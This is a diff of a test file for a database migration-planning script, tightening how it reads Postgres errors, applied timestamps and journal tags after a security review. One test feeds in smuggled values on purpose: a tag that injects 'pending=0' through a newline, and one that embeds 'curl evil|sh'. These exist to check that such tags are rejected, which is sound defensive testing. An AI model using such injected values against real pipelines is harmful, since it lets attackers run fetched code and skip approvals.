@@ -7,6 +7,7 @@ import {
   JOURNAL_PATH,
   describeError,
   describePlan,
+  unreachableMigrations,
   isMissingMigrationsTable,
   pendingMigrations,
   readAppliedAt,
@@ -65,7 +66,7 @@ test("an entry with no usable tag or timestamp is counted as unreadable, not ign
 test("a plan built from an unreadable journal fails rather than reporting a count", () => {
   const plan = describePlan([{ tag: "0000_a", when: 100 }], 2);
   assert.equal(plan.ok, false);
-  assert.match(plan.summary, /cannot be read/);
+  assert.match(plan.summary, /cannot be trusted/);
 });
 
 test("a plan with nothing pending says so, so nobody is asked to approve nothing", () => {
@@ -86,11 +87,28 @@ test("a plan names every migration the approver is being asked about", () => {
 });
 
 test("a missing migrations table reads as nothing applied, not as an error", () => {
-  // What a database that has never been migrated looks like.
+  // What a database that has never been migrated looks like, as the driver
+  // reports it: the code is what identifies it.
   const query = async () => {
-    throw new Error('relation "drizzle.__drizzle_migrations" does not exist');
+    throw Object.assign(new Error('relation "drizzle.__drizzle_migrations" does not exist'), {
+      code: "42P01",
+    });
   };
   return readAppliedAt(query).then((applied) => assert.deepEqual(applied, []));
+});
+
+// THE PROSE FALLBACK WAS REMOVED, AND THIS IS WHY. "does not exist" also matches
+// `database "nostavel_uat" does not exist` and `role "x" does not exist`, so a
+// connection failure read as a fresh database - and the owner would be shown a
+// plan listing every migration against a database the script never read, which
+// looks exactly like a legitimate first deploy. Raised by the NOS-61 security
+// review; the codes are sufficient, and the integration test proves the driver
+// carries them.
+test("an error that only says does not exist, with no code, is thrown", async () => {
+  const noCode = async () => {
+    throw new Error('database "nostavel_uat" does not exist');
+  };
+  await assert.rejects(() => readAppliedAt(noCode), /nostavel_uat/);
 });
 
 // REGRESSION TEST FOR THE DEFECT THE INTEGRATION TEST FOUND. The real driver
@@ -109,9 +127,7 @@ test("a missing table is recognised through the driver's own wrapper", async () 
   assert.deepEqual(await readAppliedAt(wrapped), []);
 });
 
-test("a missing table is recognised by its Postgres code even with no useful text", async () => {
-  // The code is the contract; the prose is what changes without warning. Same
-  // ordering as isUnpaidRefusal on the money path (NOS-5).
+test("a missing table is recognised by its code alone, with no useful text anywhere", async () => {
   const byCode = () => {
     throw new Error("Failed query", { cause: Object.assign(new Error("boom"), { code: "42P01" }) });
   };
@@ -176,14 +192,89 @@ test("any other database failure is thrown, never reported as nothing applied", 
   await assert.rejects(() => readAppliedAt(query), /ENOTFOUND/);
 });
 
-test("applied timestamps are read as numbers, and unusable rows are dropped", async () => {
-  const query = async () => [
-    { created_at: "100" },
-    { created_at: 200 },
-    { created_at: null },
-    { created_at: "not-a-number" },
-  ];
+test("applied timestamps are read as numbers, including the bigint-as-string the driver returns", async () => {
+  const query = async () => [{ created_at: "100" }, { created_at: 200 }];
   assert.deepEqual(await readAppliedAt(query), [100, 200]);
+});
+
+// WAS "unusable rows are dropped". Changed on the NOS-61 security review: a null
+// created_at is not a row to tidy away, it is the point where this script and
+// drizzle stop agreeing. Postgres sorts NULLs FIRST in DESC, so drizzle's
+// `order by created_at desc limit 1` picks it, `Number(null)` is 0, and it
+// re-applies every migration - while dropping the row here would have reported
+// nothing pending.
+test("a row whose created_at is not a number stops the plan rather than being dropped", async () => {
+  for (const bad of [null, undefined, "", "not-a-number", {}]) {
+    const query = async () => [{ created_at: 100 }, { created_at: bad }];
+    await assert.rejects(() => readAppliedAt(query), /not a number/, `expected ${JSON.stringify(bad)} to refuse`);
+  }
+});
+
+  // THE FOOTGUN THIS SCRIPT AND DRIZZLE SHARE. Both decide from a single
+  // high-water mark, so an entry older than the newest applied migration is
+  // skipped by drizzle and reported as "not pending" here. They agree on being
+  // wrong, and this is the only place positioned to notice.
+  test("an entry below the high-water mark that was never applied is unreachable", () => {
+    // Branch B generated 200 first, branch A generated 300 and merged first.
+    const j = journal(entry("0000_a", 100), entry("0001_b", 200), entry("0002_c", 300));
+    const unreachable = unreachableMigrations(j, [100, 300]);
+    assert.deepEqual(unreachable.map((u) => u.tag), ["0001_b"]);
+  });
+
+  test("nothing is unreachable when every entry at or below the mark was applied", () => {
+    const j = journal(entry("0000_a", 100), entry("0001_b", 200), entry("0002_c", 300));
+    assert.deepEqual(unreachableMigrations(j, [100, 200]), []);
+  });
+
+  test("nothing is unreachable on a database that has never been migrated", () => {
+    // Everything is pending, which is correct and is not the same problem.
+    const j = journal(entry("0000_a", 100), entry("0001_b", 200));
+    assert.deepEqual(unreachableMigrations(j, []), []);
+  });
+
+  test("a plan refuses outright when any migration is unreachable", () => {
+    const plan = describePlan([], 0, [{ tag: "0001_b", when: 200 }]);
+    assert.equal(plan.ok, false);
+    assert.match(plan.summary, /never be applied/);
+    assert.match(plan.summary, /0001_b/);
+    // The likely cause is named, because the fix is not obvious from the symptom.
+    assert.match(plan.summary, /rebased/);
+  });
+
+  test("the unreachable refusal takes precedence over an unreadable journal", () => {
+    // Both are refusals; this one is reported because it is the one that makes
+    // the rest of the plan a lie rather than merely unreadable.
+    const plan = describePlan([], 2, [{ tag: "0001_b", when: 200 }]);
+    assert.equal(plan.ok, false);
+    assert.match(plan.summary, /never be applied/);
+  });
+
+  test("the real journal has no unreachable entry against a fully applied database", () => {
+    const real = JSON.parse(readFileSync(join(repoRoot(), JOURNAL_PATH), "utf8"));
+    const allWhens = real.entries.map((e) => e.when);
+    assert.deepEqual(unreachableMigrations(real, allWhens), []);
+  });
+
+// A TAG IS WRITTEN TO A JOB OUTPUT AND READ BACK AS A DECISION. A newline in one
+// injects an extra output line, and a later `pending=` wins - which would show
+// the owner a pending migration while telling the pipeline there were none, so
+// the approval is skipped and the gate reports "proceeding with no database
+// changes". Found by the NOS-61 security review.
+test("a tag that is not a plain identifier makes the journal unreadable", () => {
+  for (const tag of ["0005_x\npending=0", '0005_x"; curl evil|sh; echo "', "0005 x", "a".repeat(200), ""]) {
+    const j = journal(entry("0000_ok", 100), entry(tag, 200));
+    assert.equal(unreadableEntries(j), 1, `expected ${JSON.stringify(tag)} to be unreadable`);
+    // And it is never reported as something to apply.
+    assert.deepEqual(pendingMigrations(j, []).map((p) => p.tag), ["0000_ok"]);
+    assert.equal(describePlan(pendingMigrations(j, []), unreadableEntries(j)).ok, false);
+  }
+});
+
+test("the tags drizzle really generates are accepted", () => {
+  // The permissive direction, so the rule above cannot drift into rejecting
+  // ordinary migrations. These are this repository's own five.
+  const real = JSON.parse(readFileSync(join(repoRoot(), JOURNAL_PATH), "utf8"));
+  assert.equal(unreadableEntries(real), 0);
 });
 
 // Guards the scan itself, the way server-only-boundary.test.ts guards its own:
